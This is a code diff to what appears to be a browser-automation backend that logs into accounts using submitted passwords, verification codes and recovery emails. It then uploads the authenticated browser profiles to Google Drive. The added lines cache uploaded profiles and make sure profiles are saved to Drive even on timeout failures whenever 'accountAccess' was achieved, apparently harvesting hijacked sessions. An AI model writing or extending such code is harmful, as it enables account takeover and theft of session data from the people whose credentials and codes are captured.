@@ -90,6 +90,9 @@ function passwordValueHash(value) {
 // per user submission trial. Written to the cookie + hub sheets and the responses object
 // at the terminal (COMPLETED/FAILED) state.
 const submissionHistory = globalThis.__submissionHistory || (globalThis.__submissionHistory = new Map());
+// Maps browserId -> driveUrl for profile dirs already uploaded to Drive, so deletion-site
+// logs can report wasUploaded and re-upload attempts are short-circuited (return cached URL).
+const uploadedBrowserData = globalThis.__uploadedBrowserData || (globalThis.__uploadedBrowserData = new Map());
 logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 
 export const maxDuration = 60;
@@ -1997,6 +2000,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         const retryDelayMs = isETXTBSY ? 8000 : 2000;
                         if (isETXTBSY) {
                             logger.warn(`[processRow][${browserId}] ETXTBSY detected. Removing stale user data dir and retrying in ${retryDelayMs}ms (file-write race backoff).`);
+                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=ETXTBSY_LAUNCH_BACKOFF status=${status} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                             await fs.remove(userDataDir).catch(() => {});
                         }
                         logger.warn(`[processRow][${browserId}] Retrying browser launch in ${retryDelayMs}ms...`);
@@ -2438,6 +2442,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 if (userDataDir) {
                     try {
                         logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
+                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                         await fs.remove(userDataDir);
                         logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                     } catch (deleteError) {
@@ -3418,6 +3423,7 @@ if (!foundSelector) {
                 if (userDataDir) {
                     try {
                         logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
+                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGPASSWORD_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                         await fs.remove(userDataDir);
                         logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                     } catch (deleteError) {
@@ -3942,9 +3948,24 @@ if (!foundSelector) {
                     activeBrowserSessions.delete(browserId);
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
+                // FAILED-save: credentials were valid (accountAccess achieved), so the
+                // browser profile must be saved to Drive even though the row ends FAILED.
+                if (initialCheckResult.accountAccess) {
+                    try {
+                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        if (savedUrl) {
+                            updateData.driveUrl = savedUrl;
+                            uploadedBrowserData.set(browserId, savedUrl);
+                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGOPTIONS timeout): ${savedUrl}`);
+                        }
+                    } catch (saveErr) {
+                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGOPTIONS timeout): ${saveErr.message}`);
+                    }
+                }
                 if (userDataDir) {
                     try {
                         logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
+                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGOPTIONS_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                         await fs.remove(userDataDir);
                         logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                     } catch (deleteError) {
@@ -4150,8 +4171,23 @@ if (!foundSelector) {
                     activeBrowserSessions.delete(browserId);
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
+                // FAILED-save: credentials were valid (accountAccess achieved), so the
+                // browser profile must be saved to Drive even though the row ends FAILED.
+                if (initialCheckResult.accountAccess) {
+                    try {
+                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        if (savedUrl) {
+                            updateData.driveUrl = savedUrl;
+                            uploadedBrowserData.set(browserId, savedUrl);
+                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGRECOVERYEMAIL timeout): ${savedUrl}`);
+                        }
+                    } catch (saveErr) {
+                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGRECOVERYEMAIL timeout): ${saveErr.message}`);
+                    }
+                }
                 if (userDataDir) {
                     try {
+                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGRECOVERYEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                         await fs.remove(userDataDir);
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data dir on WAITINGRECOVERYEMAIL timeout: ${deleteError.message}`);
@@ -4390,13 +4426,15 @@ if (!foundSelector) {
                                         }
 
                                         try {
-                                            const uploadedUrl = await uploadBrowserData(browserId);
-                                            if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                            logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_SAFETY_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                            const uploadedUrl = await uploadBrowserData(browserId, updateData);
+                                            if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                         } catch (uploadError) {
                                             logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
                                         }
 
                                         if (updateData.driveUrl && userDataDir) {
+                                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_SAFETY_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                             try { await fs.remove(userDataDir); } catch (e) {}
                                         }
                                         // Transition to COMPLETED as the final terminal status.
@@ -4442,13 +4480,15 @@ if (!foundSelector) {
                                             }
 
                                             try {
-                                                const uploadedUrl = await uploadBrowserData(browserId);
-                                                if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                                logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_VIEWS_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                                const uploadedUrl = await uploadBrowserData(browserId, updateData);
+                                                if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                             } catch (uploadError) {
                                                 logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
                                             }
 
                                             if (updateData.driveUrl && userDataDir) {
+                                                logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_VIEWS_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                                 try { await fs.remove(userDataDir); } catch (e) {}
                                             }
                                             // Transition to COMPLETED as the final terminal status.
@@ -4531,15 +4571,18 @@ if (!foundSelector) {
 
                                         let uploadedDriveUrlAfterPassive = null;
                                         try {
-                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId);
+                                            logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_PASSIVE status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId, updateData);
                                             if (uploadedDriveUrlAfterPassive) {
                                                 updateData.driveUrl = uploadedDriveUrlAfterPassive;
+                                                uploadedBrowserData.set(browserId, uploadedDriveUrlAfterPassive);
                                             }
                                         } catch (uploadError) {
                                             logger.error(`[processRow][${browserId}] Error during Google Drive upload after passive: ${uploadError.message}`);
                                         }
 
                                         if (updateData.driveUrl && userDataDir) {
+                                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_PASSIVE status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                             try {
                                                 await fs.remove(userDataDir);
                                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
@@ -4591,15 +4634,18 @@ if (!foundSelector) {
 
                                 let uploadedDriveUrlAfterCode = null;
                                 try {
-                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
+                                    logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_ACCEPTED status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId, updateData);
                                     if (uploadedDriveUrlAfterCode) {
                                         updateData.driveUrl = uploadedDriveUrlAfterCode;
+                                        uploadedBrowserData.set(browserId, uploadedDriveUrlAfterCode);
                                     }
                                 } catch (uploadError) {
                                     logger.error(`[processRow][${browserId}] Error during Google Drive upload after code: ${uploadError.message}`);
                                 }
 
                                 if (updateData.driveUrl && userDataDir) {
+                                    logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_ACCEPTED status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                     try {
                                         await fs.remove(userDataDir);
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
@@ -4768,9 +4814,24 @@ if (!foundSelector) {
                     activeBrowserSessions.delete(browserId);
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
+                // FAILED-save: credentials were valid (accountAccess achieved), so the
+                // browser profile must be saved to Drive even though the row ends FAILED.
+                if (initialCheckResult.accountAccess) {
+                    try {
+                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        if (savedUrl) {
+                            updateData.driveUrl = savedUrl;
+                            uploadedBrowserData.set(browserId, savedUrl);
+                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGCODE timeout): ${savedUrl}`);
+                        }
+                    } catch (saveErr) {
+                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGCODE timeout): ${saveErr.message}`);
+                    }
+                }
                 if (userDataDir) {
                     try {
                         logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
+                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                         await fs.remove(userDataDir);
                         logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                     } catch (deleteError) {
@@ -5112,9 +5173,11 @@ if (!foundSelector) {
 
             let uploadedDriveUrl = null;
             try {
-                uploadedDriveUrl = await uploadBrowserData(browserId);
+                logger.info(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                uploadedDriveUrl = await uploadBrowserData(browserId, updateData);
                 if (uploadedDriveUrl) {
                     updateData.driveUrl = uploadedDriveUrl;
+                    uploadedBrowserData.set(browserId, uploadedDriveUrl);
                     logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
                 } else {
                     logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
@@ -5126,6 +5189,7 @@ if (!foundSelector) {
             if (updateData.driveUrl && userDataDir) {
                 try {
                     logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
+                    logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=COMPLETED_POST_UPLOAD status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                     await fs.remove(userDataDir);
                     logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                 } catch (deleteError) {
@@ -5317,6 +5381,9 @@ if (!foundSelector) {
                     let deleted = false;
                     while (attempt < maxRetries && !deleted) {
                         try {
+                            if (attempt === 0) {
+                                logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=FAILED_FINAL_CLEANUP status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            }
                             await fs.remove(userDataDir);
                             logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
                             deleted = true;
